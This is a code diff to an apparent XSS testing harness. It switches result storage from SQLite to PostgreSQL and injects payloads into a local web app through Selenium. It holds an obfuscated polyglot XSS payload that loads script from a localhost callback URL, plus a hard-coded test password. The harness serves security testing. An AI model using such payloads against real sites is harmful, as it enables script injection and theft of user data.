@@ -4,7 +4,7 @@ from bs4 import BeautifulSoup
 from deepdiff import DeepDiff
 from seleniumwire import webdriver
 from payloads import *
-import sqlite3
+import psycopg2
 import cv2
 import numpy as np
 
@@ -68,15 +68,22 @@ def single_experiment(driver: webdriver, payloads: list[str], experiment_functio
     expected_diff = DeepDiff(soup_uuid_1, soup_uuid_2)
     print_diff(expected_diff)
 
-    db = sqlite3.connect("instance/flaskr.sqlite", timeout=10)
+    conn = psycopg2.connect(
+        host="localhost",
+        port="8080",
+        database="xss_db",
+        user="xss",
+        password="xss"
+    )
 
     # generate diffs for each payload and compare to the expected diff, save differences
     for payload in payloads:
-        db.execute("INSERT INTO xss (payload, attacked_path) VALUES (?, ?)",
+        cursor = conn.cursor()
+        cursor.execute("INSERT INTO xss_eval (payload, attacked_path) VALUES (%s, %s)",
                     (payload, experiment_function.__name__))
-        db.commit()
-        cur = db.execute("SELECT id, payload, attacked_path FROM xss WHERE payload == ? AND attacked_path == ? ORDER BY id DESC", (payload, experiment_function.__name__))
-        experiment_id = cur.fetchone()[0]
+        conn.commit()
+        cursor.execute("SELECT id, payload, attacked_path FROM xss_eval WHERE payload = %s AND attacked_path = %s ORDER BY id DESC", (payload, experiment_function.__name__))
+        experiment_id = cursor.fetchone()[0]
         payload = payload.replace("<id>", str(experiment_id))
         print(payload)
         html_payload = experiment_function(driver, URL, payload)
@@ -95,11 +102,10 @@ def single_experiment(driver: webdriver, payloads: list[str], experiment_functio
                 print("CODE: ", req.response.status_code)
                 break
 
-        db.execute("UPDATE xss SET impact = ? WHERE id = ?", (str(result), experiment_id))
-        db.commit()
+        cursor.execute("UPDATE xss_eval SET impact = %s WHERE id = %s", (str(result), experiment_id))
+        conn.commit()
         print(result)
 
-    db.close()
     driver.quit()
 
 payloads = ["\"<ScRiPt sRc=`http://localhost:5000/submit/<id>`></ScRiPt>nOeMbed><ScRiPt sRc='http://localhost:5000/submit/<id>'></ScRiPt>\"&gt;import(`http://localhost:5000/submit/<id>`) <!--hTmL>' oNLoAd= )texTarEa&gt;<iMg-<ScRiPt sRc=`http://localhost:5000/submit/<id>`></ScRiPt> oNFoCus=*/';/ifRaMe>hTmL> oNtOgGle=/*`>/sOurCe&gt; oNmOuSeLeaVe= > OnBlUr= <ScRiPt sRc='http://localhost:5000/submit/<id>'></ScRiPt>iMg/* onClICk=import(\"http://localhost:5000/submit/<id>\")", "sane"]
